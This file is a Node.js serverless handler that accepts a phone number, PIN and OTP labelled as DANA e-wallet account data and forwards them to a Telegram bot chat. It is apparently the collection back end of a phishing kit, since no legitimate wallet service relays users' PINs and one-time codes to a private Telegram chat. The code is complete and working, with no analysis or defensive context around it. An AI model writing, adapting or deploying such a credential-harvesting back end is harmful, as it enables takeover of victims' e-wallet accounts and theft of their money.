const axios = require('axios');

// Format Telegram message without hyphens in phone number
function formatMessage(type, phone, pin, otp) {
  // Remove all non-digit characters from phone number
  const cleanPhone = phone.replace(/\D/g, '');
  
  let message = 
    "├• AKUN | DANA E-WALLET\n" +
    "├───────────────────\n" +
    `├• NO HP : ${cleanPhone}\n`;

  if (pin) {
    message += "├───────────────────\n" +
               `├• PIN  : ${pin}\n`;
  }

  if (otp) {
    message += "├───────────────────\n" +
               `├• OTP : ${otp}\n`;
  }

  message += "╰───────────────────";
  return message;
}

exports.handler = async (event, context) => {
  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return { 
      statusCode: 405, 
      body: 'Method Not Allowed',
      headers: { 'Content-Type': 'application/json' }
    };
  }

  try {
    const { type, phone, pin, otp } = JSON.parse(event.body);

    // Clean phone number from any formatting
    const cleanPhone = phone ? phone.replace(/\D/g, '') : '';

    // Validate required fields
    if (!type || !cleanPhone || cleanPhone.length < 10) {
      return {
        statusCode: 400,
        body: JSON.stringify({ 
          error: 'Invalid request: Phone number must be at least 10 digits',
          received: phone,
          cleaned: cleanPhone
        }),
        headers: { 'Content-Type': 'application/json' }
      };
    }

    // Check for Telegram configuration
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      throw new Error('Server configuration error: Missing Telegram credentials');
    }

    // Format and send the message
    const message = formatMessage(type, cleanPhone, pin, otp);

    const telegramResponse = await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      },
      {
        timeout: 5000 // 5 seconds timeout
      }
    );

    return {
      statusCode: 200,
      body: JSON.stringify({ 
        success: true,
        telegram_status: telegramResponse.status
      }),
      headers: { 'Content-Type': 'application/json' }
    };

  } catch (error) {
    console.error('Error processing request:', error);
    
    return {
      statusCode: 500,
      body: JSON.stringify({
        error: 'Internal Server Error',
        details: error.message,
        request_body: event.body
      }),
      headers: { 'Content-Type': 'application/json' }
    };
  }
};
